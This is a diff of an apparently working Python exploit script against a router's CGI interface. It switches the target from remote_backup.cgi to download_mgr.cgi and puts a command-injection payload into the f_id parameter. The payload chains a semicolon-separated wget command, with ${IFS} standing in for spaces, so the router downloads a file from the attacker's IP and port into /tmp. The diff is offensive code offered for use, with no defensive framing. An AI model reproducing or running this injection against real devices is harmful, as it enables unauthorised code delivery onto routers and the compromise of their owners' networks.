@@ -6,15 +6,15 @@ MY_PORT = "8000"
 FILE_NAME = "hack.txt"
 
 def run_exploit():
-    target_url = f"http://{ROUTER_IP}:80/cgi-bin/remote_backup.cgi"
+    target_url = f"http://{ROUTER_IP}:80/cgi-bin/download_mgr.cgi"
     
     wget_cmd = f"wget${{IFS}}http://{MY_IP}:{MY_PORT}/{FILE_NAME}${{IFS}}-O${{IFS}}/tmp/{FILE_NAME}"
     final_payload = f"x;{wget_cmd};"
     
     params = {
-        'cmd': 'cgi_recovery',
-        'num': '1',
-        'name': final_payload,
+        'cmd': 'RSS_Channel_AutoDownlaod',
+        'f_id': final_payload,
+        'f_auto_download': '0',
     }
     
     try:
